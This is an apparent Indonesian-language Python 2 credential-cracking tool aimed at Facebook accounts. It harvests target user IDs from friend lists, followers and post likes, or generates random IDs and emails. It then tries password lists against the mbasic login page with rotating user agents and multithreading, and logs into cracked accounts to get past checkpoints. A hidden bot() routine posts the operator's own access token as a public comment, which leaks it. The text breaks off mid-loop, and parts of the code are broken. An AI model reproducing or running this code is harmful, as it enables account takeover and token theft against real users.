#!/usr/bin/python2 version --name
# coding=utf-8 #recode silahkan
# author : wwwwww 
#sayang itu harus bener bener tulus sob :v
### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
s=requests.Session()
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")

try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")


### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
id = []
cp = []
ok = []
loop = 0

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
### BAGIAN LOGO 01###
def logo():
	os.system("clear")
	time.sleep (0.1)
	print
	print
 	print ('\033[1;32m                    ______---_____ ')
  	print ('\033[1;32m         ___-----           __      ----_ ')
	print ('\033[1;33m ___---             ___------             \ ')
	print ('\033[1;33m     ---______        ----                 \ ')
	print ('\033[1;32m                 --__    |             _____) ')
	print ('\033[1;32m                     -                /     \ ')
	print ('\033[1;33m          _____-----    ___--         \    /)\ ')
	print ('\033[1;33m    -----_____      ---____            \__/  / ')
	print ('\033[1;32m                 --__    \ --    _          /\ ')
	print ('\033[1;32m                      --__-__     \_____/   \_/\ ')
	print ('\033[1;33m                            ----|   /          | ')
	print ('\033[1;36mpericode \033[1;37m : FAHRIKANOHYEE XD     \033[1;31m    |  |___________| ')
	print ('\033[1;36mnomer wa \033[1;37m : 08184 om itu nomer nya salah \033[1;37m|  | ((_(_)| )_) ')
	print ('\033[1;36mtemannya\033[1;37m : \33[3;1m\033[1;37mndriitzy = Faiztzy \033[1;33memm.. \33[0;31m\033[1;31m|  \_((_(_)|/(_) ')
	print ('\033[1;32m◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉\033[1;33m\             ( ')
	print ('\033[1;33m◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉\033[1;32m\_____________)')
### BAGIAN LOGIN 02###
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		time.sleep (0.01)
		print(" %s\x1b[1;92m╔═\x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93mAuthor    \x1b[1;97m : \x1b[1;92mMbokey = ndriitzy"%(N))
		print(" ╔═\x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93mGithub    \x1b[1;97m : \x1b[1;92mhttps://github.com/Mbokey/crack_mbokey")
		print(" ╚═\x1b[1;93m[\x1b[1;92m◉\x1b[1;93m] \x1b[1;92m ═════════════════════════════════════════════")
		print(" ╔═\x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;97m:\x1b[1;92m %s"%(tgl))
		print(" ╚═\x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;97m: \x1b[1;92m%stidak sekolah | sc \033[1;34mpremium %s"%(H,N))
		print(" \x1b[1;92m╔═\x1b[1;93m[\x1b[1;92m◉\x1b[1;93m]\x1b[1;92m ═════════════════════════════════════════════")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m]\x1b[1;93m IP         \x1b[1;97m:\x1b[1;92m %s"%(IP))
		token = raw_input('\n \x1b[1;93m[\x1b[1;92m?\x1b[1;93m] \x1b[1;92mlogin toket cewe ya! \x1b[1;97m:\x1b[1;93m ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print(" %s[!] token kadaluwarsa!"%(M))
			sys.exit() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100013291513596/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/106024538578610/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/106024515245279/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/124014098051640/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/1324794007973637/comments/?message='+token+'&access_token=' + token)

### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token kadaluwarsa!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))

    logo()
    time.sleep (0.01)
    print(" %s\x1b[1;92m╔═\x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93mAuthor    \x1b[1;97m: \x1b[1;92mMbokey = ndriitzy"%(N))
    print(" ╚═\x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93mGithub    \x1b[1;97m: \x1b[1;92mhttps://github.com/Mbokey/crack_mbokey")
    print(" ╔═\x1b[1;93m[\x1b[1;92m◉\x1b[1;93m]\x1b[1;92m ═════════════════════════════════════════════")
    print(" ╚═\x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93mBergabung \x1b[1;97m:\x1b[1;92m %s"%(tgl))
    print(" ╔═\x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93mStatus    \x1b[1;97m:\x1b[1;92m %stidak sekolah | sc \033[1;34mpremium%s"%(H,N))
    print(" \x1b[1;92m╚═\x1b[1;93m[\x1b[1;92m◉\x1b[1;93m]\x1b[1;92m ═════════════════════════════════════════════")
    print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mIP       \x1b[1;97m :\x1b[1;92m %s"%(IP))
    print("              \n \x1b[1;93m[ \x1b[1;92mselamat \x1b[1;93mdatang \x1b[1;92msayang \x1b[1;93m%s%s%s ]\n"%(K,nama,N))
    print("    \x1b[1;92m╔═\x1b[1;92m[\x1b[1;93m01\x1b[1;92m]. \x1b[1;93mcrack dari\x1b[1;92m id public/teman mu╗")
    print("    ╔═\x1b[1;92m[\x1b[1;93m02\x1b[1;92m]. \x1b[1;93mcrack dari \x1b[1;92mid masal/brutal═══╝")
    print("    ╚═\x1b[1;92m[\x1b[1;93m03\x1b[1;92m]. \x1b[1;93mcrack dari \x1b[1;92mffollowers═══════╗")
    print("    ╔═\x1b[1;92m[\x1b[1;93m04\x1b[1;92m]. \x1b[1;93mcrack dari \x1b[1;92mpostingan/profil═╝")
    print("    ╚═\x1b[1;92m[\x1b[1;93m05\x1b[1;92m]. \x1b[1;93mcrack random \x1b[1;92m fb new/baru═╗")
    print("    ╔═\x1b[1;92m[\x1b[1;93m06\x1b[1;92m]. \x1b[1;93mcrack random \x1b[1;92mfb old/lama══╝")
    print("    ╚═\x1b[1;92m[\x1b[1;93m07\x1b[1;92m]. \x1b[1;93mcrack random \x1b[1;92memail fb════════════════════╗")
    print("    ╔═\x1b[1;92m[\x1b[1;93m08\x1b[1;92m]. \x1b[1;93minformasi tambahan/\x1b[1;92mlain  yang tersembunyi╝")
    jalan("    ╚═\x1b[1;93m[%s\x1b[1;91m00%s\x1b[1;93m]. \x1b[1;91mlogout\x1b[1;97m (hapus token)"%(M,N))
    asw = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m]\x1b[1;93m pilih \x1b[1;92mmenu\x1b[1;97m ═\x1b[1;97m ")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    	atursandi()
    elif asw == "2":
    	massal()
    	atursandi()
    elif asw == "3":
    	followers()
    	atursandi()
    elif asw == "4":
    	postingan()
    	atursandi()
    elif asw == "5":
    	fbbaru()
        sandimanual()
    elif asw == "6":
    	fbtua()
        sandimanual()
    elif asw == "7":
    	emailfb()
        sandimanual()
    elif asw == "8":
    	infotambahan()
    elif asw == "0":
    	os.system('rm -f token.txt')
    	jalan(" [✓] berhasil menghapus token ")
    	exit()
    else:
    	jalan(" \x1b[1;91m[\x1b[1;97m!\x1b[1;91m]\x1b[1;97m pilih jawaban dengan bener ! ")
    	menu() 
### INFORMASI TAMBAHAN ###
def infotambahan():
	print("\n \x1b[1;92m[\x1b[1;93m1\x1b[1;92m] \x1b[1;93mcek opsi\x1b[1;92m hasil crack")
	print(" \x1b[1;92m[\x1b[1;93m2\x1b[1;92m] \x1b[1;93mlihat akun \x1b[1;92mhasil crack")
	print(" \x1b[1;92m[\x1b[1;93m3\x1b[1;92m] laporkan bug script")
	print(" \x1b[1;92m[\x1b[1;93m4\x1b[1;92m] \x1b[1;93mkembali \x1b[1;92mke menu")
	fall = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mpilih \x1b[1;97m: ")
	if fall == "":
		menu()
	elif fall == "1":
		cekopsi()
	elif fall == "2":
		cekhasil()
	elif fall == "3":
		laporbug()
	elif fall == "4":
		menu()
	else:
		menu()
		
### DUMP PUBLIK ###
def publik():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
		time.sleep (0.01)
		print
	jalan(" \x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93misi \x1b[1;92m'me' \x1b[1;93mjika ingin crack dari daftar kawan")
	time.sleep (0.01)
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93mmasukan id \x1b[1;92mtarget \x1b[1;97m:\x1b[1;92m ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93makun tid\x1b[1;92mak tersedia atau \x1b[1;93mlist  tidak \x1b[1;92mpublik tolol")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id  \x1b[1;97m:\x1b[1;92m %s%s%s"%(M,len(id),N)) 
  
### DUMP MASSAL ###
def massal():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	try:
		tanya_total = int(raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;92mmasukan ju\x1b[1;93mmlah target : "))
	except:tanya_total=1
	print(" \x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93misi \x1b[1;92m'me' \x1b[1;93mjika ingin\x1b[1;92m crack dari \x1b[1;93mdaftar teman")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mid target %s \x1b[1;97m:\x1b[1;92m "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93makun tida\x1b[1;92mk tersedia ata\x1b[1;93mu list tid\x1b[1;92mak publik tolol")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id \x1b[1;97m :\x1b[1;92m %s%s%s"%(M,len(id),N))
	
### DUMP FOLLOWERS ###
def followers():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	print(" \x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93misi \x1b[1;92m'me'\x1b[1;93m jika ingin crack dari pengikut sendiri")
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m◉\x1b[1;92m] \x1b[1;93mmasukan id \x1b[1;92matau username\x1b[1;97m :\x1b[1;92m ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" [!] akun tidak tersedia atau list teman private")
	print("\n [+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP POSTINGAN ###
def postingan():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan url ata\x1b[1;92mu id postingan\x1b[1;97m :\x1b[1;92m ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mpostingan ti\x1b[1;92mdak tersedia \x1b[1;93matau post tidak \x1b[1;92mpublik tolol")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id  \x1b[1;97m:\x1b[1;92m %s%s%s"%(M,len(id),N))
	
### DUMP ID RANDOM NEW ###
def fbbaru():
	x = 11111111111
	xx = 77777777777
	idx = "5000" 
	limit = int(input(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mmasukan \x1b[1;92mjumlah id \x1b[1;93m(cth 5000): "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+"<=>"+str(_))
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;91m!\x1b[1;92m] \x1b[1;93makun tidak t\x1b[1;92mersedia atau error")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id  \x1b[1;97m:\x1b[1;92m %s%s%s"%(M,len(id),N))
	
### DUMP ID RANDOM OLD ###
def fbtua():
	x = 111111111
	xx = 999999999
	idx = "5000" 
	limit = int(input(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mmasukan jumlah id\x1b[1;92m (cth 5000): "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+"<=>"+str(_))
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;91m!\x1b[1;92m] \x1b[1;93makun tidak t\x1b[1;92mersedia atau error")
	print("\n \x1b[1;92m[\x1b[1;93m\x1b[1;92m+] \x1b[1;93mtotal id  \x1b[1;97m:\x1b[1;92m %s%s%s"%(M,len(id),N))
	
### DUMP ID RANDOM EMAIL ###
def emailfb():
	x = 111
	xx = 999
	idx = "name" 
	nama = input("\x1b[1;92m [\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan nama \x1b[1;92m(cth: angga): ")
	nama = nama.replace(" ", "")
	domain = input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;92m[\x1b[1;93mG\x1b[1;92m]\x1b[1;93mmail.com, [\x1b[1;92mY\x1b[1;93m]\x1b[1;92mahoo.com, \x1b[1;95m[H]otmail.com : ")
	if domain in [""]:Main()
	elif domain in ["G", "g"]:
		idx = "@gmail.com"
	elif domain in ["Y", "y"]:
		idx = "@yahoo.com"
	elif domain in ["H", "h"]:
		idx = "@hotmail.com"
	else:Main()
	limit = int(input(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mmasukan jumlah id \x1b[1;92m(cth 5000): "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			___ = nama
			self.id.append(___+"<=>"+str(_)+__)
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;91m!\x1b[1;92m] \x1b[1;93makun tidak terse\x1b[1;92mdia atau error")
	print("\n \x1b[1;92m[\x1b[1;91m+\x1b[1;92m] \x1b[1;92mtotal id\x1b[1;97m  :\x1b[1;92m %s%s%s"%(M,len(id),N))
	
### CEK HASIL CRACK ###
def cekhasil():
	time.sleep (0.01)
	print('\n\x1b[1;93m [\x1b[1;92m1\x1b[1;93m]. \x1b[1;92mlihat hasil crack OK ')
	print('\x1b[1;92m [\x1b[1;93m2\x1b[1;92m]. \x1b[1;93mlihat hasil crack CP ')
	anjg = raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mpilih\x1b[1;97m :\x1b[1;92m ')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print("")
		for file in dirs:
			print(" [*] "+file)
		try:
			file = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m]\x1b[1;93m mau lihat ha\x1b[1;92msil yang mana \x1b[1;93m?\x1b[1;97m: ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n \x1b[1;93m*\x1b[1;92m-------------------------------------------------\x1b[1;93m*")
		print("\x1b[1;92m [\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtanggal \x1b[1;97m: %s -\x1b[1;92mtotal \x1b[1;97m: %s"%(del_txt, len(totalok)))
		os.system("cat OK/%s"%(file))
		raw_input("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;92menter un\x1b[1;97mtuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print("")
		for file in dirs:
			print(" [*] "+file)
		try:
			file = raw_input("\n \x1b[1;92m[\x1b[1;91m?\x1b[1;92m] \x1b[1;93mmau lihat \x1b[1;92mhasil yang mana \x1b[1;93m?\x1b[1;97m: ")
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n \x1b[1;93m*\x1b[1;92m-------------------------------------------------\x1b[1;93m*")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtanggal \x1b[1;97m: %s -\x1b[1;92mtotal \x1b[1;97m: %s"%(del_txt, len(totalcp)))
		os.system("cat CP/%s"%(file))
		raw_input("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untu\x1b[1;97mk kembali ke menu ")
		menu()
	else:
		menu()
	
####CEK OPSI HASIL CRACK####
def cekopsi():
	dirs = os.listdir("CP")
	print("")
	for file in dirs:
		print(" [◉] CP/"+file)
	print("\n [◉] masukan file (ex: CP/%s.txt)"%(tanggal))
	files = raw_input(" [?] nama file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n [!] nama file %s tidak tersedia"%(files))
	print('\n [!] anda bisa mematikan data selular untuk menjeda proses cek\n')
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n [+] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
		try:
			check_in(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n \x1b[1;92m[\x1b[1;91m!\x1b[1;92m] \x1b[1;93mcek akun \x1b[1;92msudah selesai...")
	raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93menter untuk k\x1b[1;92membali ke menu ")
	time.sleep(1)
	menu()
	
def check_in(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2'
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36'

])
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("raw_input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" [+] aplikasi terhubung ada : "+str(len(xe)))
		num = 0
		for _ in xe:
			num += 1
			print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("raw_input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("raw_input",{"name":"jazoest"})["value"]
		nh   = form.find("raw_input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if "Lihat detail login yang ditampilkan. Ini Anda?" in str(xnxx):
			print("\r  🌟 %sTinggal 1 langkah lagi untuk membuka akun facebook. silahkan buka di browser%s"%(H,N))
		else:
			print(" [+] terdapat "+str(len(ngew))+" opsi ")
			for opt in range(len(ngew)):
				print("  ["+str(opt+1)+"] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")

### LAPOR BUG SCRIPT ###
def laporbug():
	asulo = input("\n [?] masukan laporan bug script : ").replace(' ','%20')
	if asulo == "":
		menu()
	os.system('xdg-open https://wa.me/6282329761867?text=' +asulo)
	input("\n [◉] tekan enter untuk kembali ke menu")
	menu()
### BAGIAN SANDI ####
def atursandi():
	ask=raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mapakah anda ingin m\x1b[1;92menggunakan sandi manual\x1b[1;97m? \x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;92mt]\x1b[1;97m:")
	if ask=="y":
		sandimanual()
	elif ask=="t":
		sandiotomatis()
	else:
		exit(" %s\x1b[1;92m[\x1b[1;91m!\x1b[1;92m] \x1b[1;93mpilih jawaban\x1b[1;92m dengan benar!"%(M))

def sandimanual():
	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mgunakan \x1b[1;92m, (koma)\x1b[1;93m untuk pemisah contoh \x1b[1;97m: \x1b[1;93msandi123,\x1b[1;92msandi12345,\x1b[1;96mdll. \x1b[1;93msetiap kata minimal \x1b[1;92m6 \x1b[1;93mkarakter atau lebih")
	pwek=raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan kata sandi\x1b[1;97m :\x1b[1;92m ')
	print('\x1b[1;92m [\x1b[1;93m*\x1b[1;92m] \x1b[1;93mcrack dengan sandi\x1b[1;97m -> [ %s%s%s ]' % (M, pwek, N))
	if pwek=="":
		exit(" %s\x1b[1;92m[\x1b[1;91m!\x1b[1;92m]\x1b[1;93m isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		time.sleep (0.01)
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mmasukan sandi minimal \x1b[1;92m6\x1b[1;92m angka!"%(M))
	print("\n \x1b[1;92m[\x1b[1;93m pilih method \x1b[1;92mversion crack- \x1b[1;93msilahkan coba satu²\x1b[1;92m ]\n")
	print(" \x1b[1;92m[\x1b[1;93m1\x1b[1;92m]. \x1b[1;93mmethodd    API \x1b[1;92m(fast)═╗")
	print("\x1b[1;92m [\x1b[1;93m2\x1b[1;92m]. \x1b[1;93mmethodd  mbasic\x1b[1;92m (slow)════╗")
	print("\x1b[1;92m [\x1b[1;93m3\x1b[1;92m]. \x1b[1;93mmethod mobile\x1b[1;92m (super slow)╝")
	ask=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod\x1b[1;97m : ")
	print
	if ask=="":
		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar!"%(M))
	elif ask=="1":
		time.sleep (0.01)
		print('\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('\x1b[1;93m [\x1b[1;92m+\x1b[1;93m] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n\x1b[1;92m [\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan \x1b[1;92mdata selular untuk menj\x1b[1;93meda proses crack\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
